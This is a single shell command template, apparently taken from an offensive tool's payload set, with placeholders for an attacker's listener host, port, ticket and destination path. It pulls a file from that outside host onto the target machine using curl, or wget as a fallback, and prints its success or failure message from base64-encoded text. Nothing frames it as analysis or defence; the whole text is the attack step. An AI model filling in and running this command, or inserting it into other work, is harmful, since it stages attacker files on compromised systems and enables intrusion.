url="http://*LHOST*:*LPORT*/*TICKET*"; dst="*DEST*"; ((curl -s $url -o $dst || wget -q $url -O $dst) && echo U3VjY2VzcyEK | base64 -d) || echo Q29tbWFuZCBmYWlsZWQuCg== | base64 -d
